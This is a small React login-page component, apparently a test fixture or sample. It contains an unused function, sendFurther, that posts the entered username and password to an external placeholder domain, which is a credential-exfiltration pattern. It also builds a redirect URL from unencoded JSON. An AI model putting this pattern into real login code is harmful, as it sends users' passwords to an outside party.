//index.html
import React, { useState } from 'react';

const SignInPage = () => {

  const [username,setUsername] = useState("");
  const [password,setPassword] = useState("");
  const [loginFailed,setLoginFailed] = useState(false); 

  const redirect = () => {
    const payload = {username:username};
    window.location.href = `/user?payload=${JSON.stringify(payload)}`;
  }

  const sendFurther = () => {
    return fetch("http://ThIsDoMaInShOuLdNoTeXiStPlEaSeAnDtHaNkYoU.com/login",
    {
      method : "POST",
      body : JSON.stringify({username:username,password:password}),
      headers : {
        'Content-Type' : "application/json"
      }
    }).then(redirect,() =>setLoginFailed(true))
  }

  return (
    <div className="container">
        <h2>Login</h2>
        <div>
            <p>{loginFailed ? "Login failed" : ""} </p>
            <label>
              Username:
              <input type="text" value={username} onChange={(e) => setUsername(e.target.value)}></input>
            </label>
            <label>Password:
              <input type="password" value={password} onChange={(e) => setPassword(e.target.value)}></input>
            </label>
            <input type="submit" value="Login" onClick={redirect}></input>
        </div>
    </div>
  );
}

export default SignInPage;